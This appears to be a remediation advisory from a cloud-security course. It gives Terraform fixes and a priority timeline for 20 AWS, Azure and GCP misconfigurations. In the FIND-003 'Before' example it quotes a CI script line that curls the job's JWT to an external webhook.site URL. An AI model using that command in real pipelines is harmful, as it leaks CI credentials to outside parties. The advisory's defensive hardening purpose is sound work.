# Remediation Advisory

**Module:** 07 – Remediation  
**Scope:** Fixed Terraform code for all 20 findings (critical + high severity)

---

## Quick Reference: All 20 Findings Fixed

| Finding | Issue | Fix | Module |
|---------|-------|-----|--------|
| FIND-001 | AWS hardcoded access key | IAM role | 03 |
| FIND-002 | AWS hardcoded secret key | Lambda assume role | 03 |
| FIND-003 | JWT token to external webhook | Internal OIDC only | 02 |
| FIND-004 | S3 publicly readable | Block public access + IAM | 05 |
| FIND-005 | S3 no encryption in transit | Enforce SSL/TLS | 05 |
| FIND-006 | Azure no MFA for admins | Conditional Access | 03 |
| FIND-007 | Azure weak password policy | 14+ chars + symbols | 03 |
| FIND-008 | SSH port 22 open to 0.0.0.0/0 | Restrict to bastion IP | 04 |
| FIND-009 | RDP port 3389 open to 0.0.0.0/0 | Restrict to admin IP | 04 |
| FIND-010 | Wildcard IAM `*:*` | Specific actions + resources | 03 |
| FIND-011 | GKE logging disabled | Enable Cloud Logging | 06 |
| FIND-012 | GKE master endpoint public | Authorized networks + private | 04 |
| FIND-013 | GKE no NetworkPolicy | Deny-all + explicit allow | 04 |
| FIND-014 | Azure overpermissioned roles | Scope to resource group | 03 |
| FIND-015 | GCP service account key file | Workload Identity + OIDC | 03 |
| FIND-016 | Azure Storage unencrypted | CMK + BYOK | 05 |
| FIND-017 | EBS volumes unencrypted | Enable encryption by default | 05 |
| FIND-018 | Azure SQL unencrypted | TDE + Key Vault CMK | 05 |
| FIND-019 | GCP firewall rules permissive | Deny-all + explicit IPs | 04 |
| FIND-020 | EKS logs not exported | CloudWatch + S3 + alerts | 06 |

---

## Remediation Timeline

| Priority | Findings | Deadline | Effort | Dependencies |
|----------|----------|----------|--------|--------------|
| **P0** | FIND-001, 002, 004, 005 | Day 1 | 4-8 hrs | None — deploy first |
| **P1** | FIND-003, 008, 009, 010, 012, 013 | Week 1 | 16-24 hrs | P0 stable |
| **P2** | FIND-006, 007, 014, 015, 017, 018 | Week 2 | 20-32 hrs | P1 complete |
| **P3** | FIND-011, 016, 019, 020 | Week 4 | 12-16 hrs | P2 stable |

**Total Effort:** ~52-80 hours (1-2 sprint cycles)  
**Key:** Fix P0 day 1 (active exploits), then batch remainder by cloud + type.

---

## P0: Critical (Immediate)

**FIND-001: Hardcoded AWS Key → IAM Role**
```hcl
# Before: user_data = "export AWS_ACCESS_KEY_ID=AKIA..."
# After:
resource "aws_instance" "web" {
  iam_instance_profile = aws_iam_instance_profile.ec2_profile.name
}
```

**FIND-002: Lambda Secret Key → Assume Role**
```hcl
# Before: environment { variables = { AWS_SECRET_ACCESS_KEY = "..." } }
# After:
resource "aws_lambda_function" "processor" {
  role = aws_iam_role.lambda_role.arn
}
```

**FIND-004/005: S3 Public + Unencrypted → Locked + Encrypted**
```hcl
# Before: block_public_acls = false; block_public_policy = false
# After:
resource "aws_s3_bucket_public_access_block" "data" {
  block_public_acls = true
  block_public_policy = true
  restrict_public_buckets = true
}

resource "aws_s3_bucket_server_side_encryption_configuration" "data" {
  rule { apply_server_side_encryption_by_default { sse_algorithm = "aws:kms" } }
}

resource "aws_s3_bucket_policy" "enforce_ssl" {
  policy = jsonencode({
    Statement = [{ Effect = "Deny"; Condition = { Bool = { "aws:SecureTransport" = "false" } } }]
  })
}
```

---

## P1: Urgent (Week 1)

**FIND-008/009: SSH/RDP Open World → Restricted**
```hcl
# Before: cidr_blocks = ["0.0.0.0/0"]
# After:
resource "aws_security_group_rule" "ssh" {
  cidr_blocks = ["203.0.113.5/32"]  # Bastion only
}
```

**FIND-010: Wildcard IAM → Least Privilege**
```hcl
# Before: Action = ["*"]
# After:
resource "aws_iam_role_policy" "least_privilege" {
  policy = jsonencode({
    Statement = [{
      Action = ["s3:GetObject", "s3:ListBucket"]
      Resource = ["arn:aws:s3:::bucket/*"]
    }]
  })
}
```

**FIND-012/013: GKE Public Master + No NetworkPolicy → Secured**
```hcl
# Before: master_authorized_networks_config { }; network_policy { enabled = false }
# After:
resource "google_container_cluster" "gke" {
  master_authorized_networks_config { cidr_blocks { cidr_block = "203.0.113.0/24" } }
  network_policy { enabled = true }
}
```

**FIND-003: JWT Exfiltration → Internal Only**
```yaml
# Before: script: 'curl --data "$CI_JOB_JWT_V1" https://webhook.site/...'
# After: (documented in Module 02 — token never leaves runner)
script: |
  # Use token internally for credential exchange only
  # NEVER send to external endpoint
```

---

## P2: Important (Week 2)

**FIND-006/007: Azure No MFA + Weak Password → MFA + Strong**
```hcl
# Before: No Conditional Access; default password policy
# After:
resource "azurerm_conditional_access_policy" "mfa" {
  state = "enabled"
  grant_controls { built_in_controls = ["mfa"] }
}

resource "azuread_directory_password_policy" "strong" {
  min_password_length = 14
  enforce_complex_password = true
}
```

**FIND-014: Azure Overpermissioned → Scoped**
```hcl
# Before: scope = azurerm_subscription_data.primary.id
# After:
resource "azurerm_role_assignment" "contributor" {
  scope = azurerm_resource_group.main.id
}
```

**FIND-015: Service Account Key File → Workload Identity**
```hcl
# Before: resource "google_service_account_key" { }  # Long-lived
# After:
resource "google_iam_workload_identity_pool" "github" {
  oidc { issuer_uri = "https://token.actions.githubusercontent.com" }
}
# 1-hour tokens, per-repo isolation
```

**FIND-017/018: Unencrypted EBS/SQL → Encrypted**
```hcl
# Before: encrypted = false; (no TDE)
# After:
resource "aws_ebs_volume" "data" {
  encrypted = true
  kms_key_id = aws_kms_key.ebs.arn
}

resource "azurerm_mssql_server_transparent_data_encryption" "tde" {
  key_vault_key_id = azurerm_key_vault_key.sql.id
}
```

---

## P3: Standard (Week 4)

**FIND-011/020: Cluster Logging Disabled → Enabled**
```hcl
# Before: logging_service = "none"; enabled_cluster_log_types = []
# After:
resource "google_container_cluster" "gke" {
  logging_service = "logging.googleapis.com/kubernetes"
  logging_config { enable_components = ["SYSTEM_COMPONENTS", "WORKLOADS"] }
}

resource "aws_eks_cluster" "main" {
  enabled_cluster_log_types = ["api", "audit", "authenticator"]
}
```

**FIND-016/019: Azure Storage + GCP Firewall**
```hcl
# Before: No CMK; firewall open
# After:
resource "azurerm_storage_account_customer_managed_key" "main" {
  key_vault_id = azurerm_key_vault.main.id
  key_name = azurerm_key_vault_key.storage_key.name
}

resource "google_compute_firewall" "deny_all" {
  deny { protocol = "all" }
  priority = 65534
  destination_ranges = ["0.0.0.0/0"]
}
```

---

## Notable Points

**Q: Why fix P0 before P1?**  
> "P0 findings are actively exploitable. Hardcoded keys = anyone reading code gets access. Public S3 = data breach in minutes. P0 reduces blast radius immediately."

**Q: What breaks if we don't validate P0 fixes first?**  
> "EC2 might fail to launch if IAM role lacks permissions. Lambda fails if it can't assume role. Lambda might time out waiting for metadata service. Test in staging 24 hours before prod."

**Q: Can we do all 20 in parallel or must it be sequential?**  
> "P0 fixes are independent — can run simultaneously (different cloud providers). But wait for all P0 stable before P1, otherwise cascading failures complicate debugging."

**Q: What if business says 'leave port 22 open for now'?**  
> "Document the exception + compensating control. Enable VPC Flow Logs to detect abnormal SSH traffic. Alert on repeated failed logins (brute force detection)."

---

## Implementation Checklist

- [ ] P0: IAM roles + S3 lockdown (Day 1)
- [ ] P0: Validate in staging (Day 1)
- [ ] P1: Network restrictions + IAM audit (Week 1)
- [ ] P2: Azure MFA + encryption keys (Week 2)
- [ ] P3: Logging + storage encryption (Week 4)
- [ ] All: Post-fix compliance scan
- [ ] All: Update runbooks + documentation

---

## Summary

✅ All 20 findings mapped to Terraform fixes  
✅ Code snippets provided for each priority level  
✅ ~52-80 hours total effort across 4 weeks  
✅ Dependencies documented (do P0 → P1 → P2 → P3)
